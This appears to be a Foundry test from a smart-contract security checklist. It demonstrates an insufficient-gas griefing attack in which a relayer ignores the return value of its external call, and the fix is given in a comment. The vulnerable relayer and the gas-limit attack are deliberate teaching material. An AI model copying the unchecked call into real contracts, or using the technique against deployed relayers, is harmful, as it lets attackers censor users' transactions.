// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-GA-2
 *
 * This test demonstrates an insufficient gas griefing attack vulnerability in a relayer contract.
 * In this attack, a malicious actor carefully crafts the exact gas amount to trigger an unexpected case:
 * providing just enough gas for the top-level function to succeed but not enough for the external call
 * to complete, causing the external call to fail due to gas exhaustion.
 * Since the relayer contract doesn't check the success return value of the external call, the transaction
 * is marked as executed in the mapping, preventing it from being submitted again.
 * This effectively allows an attacker to permanently censor user transactions.
 */
contract Target {
    uint256 private _storedData = 0;
    function execute(bytes memory _data) external {
        uint256 i;
        while(i < 100) {
            i++;
            _storedData += i;
        }
    }
}

contract Relayer {
    mapping (bytes => bool) public executed;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function forward(bytes memory _data) public {
        require(!executed[_data], "Replay protection");
        executed[_data] = true;

        // The external call might fail due to insufficient gas, but the transaction won't revert
        target.call(abi.encodeWithSignature("execute(bytes)", _data));

        // Below is the correct mitigation
        // (bool success,) = target.call(abi.encodeWithSignature("execute(bytes)", _data));
        // require(success, "External call failed");
    }
}

contract RelayerTest is Test {
    Target target;
    Relayer relayer;
    address actor;
    bytes testData;

    function setUp() public {
        target = new Target();
        relayer = new Relayer(address(target));
        actor = makeAddr("actor");
        testData = abi.encode("user_transaction");

        // Fund the malicious actor
        vm.deal(actor, 1 ether);
    }

    function testInsufficientGasGriefing() public {
        // Check how much gas is needed to execute the target contract
        uint256 gasBefore = gasleft();
        bytes memory tempData = abi.encode("gas_test");
        target.execute(tempData);
        uint256 gasAfter = gasleft();
        uint256 gasNeeded = gasBefore - gasAfter;
        console.log("Gas needed to execute target contract:", gasNeeded);

        // First, verify that the data hasn't been executed yet
        assertEq(relayer.executed(testData), false);

        // Malicious actor calls the forward function with precisely crafted gas amount
        // The actor deliberately calculates just enough gas for the relayer to mark
        // the transaction as executed but not enough for the external call to succeed
        vm.prank(actor);

        // We use a specific low gas limit to demonstrate the attack
        // The actor carefully crafts this value to trigger the unexpected case
        uint256 limitedGas = gasNeeded - 10000;

        // Call the forward function with limited gas
        (bool success, ) = address(relayer).call{gas: limitedGas}(
            abi.encodeWithSignature("forward(bytes)", testData)
        );

        // The top-level call should succeed even though the external call failed
        assertTrue(success, "Top-level call should succeed");

        // Verify that the data is now marked as executed
        assertTrue(relayer.executed(testData), "Data should be marked as executed");

        // Now if a legitimate user tries to submit the same transaction, it will be rejected
        vm.expectRevert("Replay protection");
        relayer.forward(testData);
    }
}
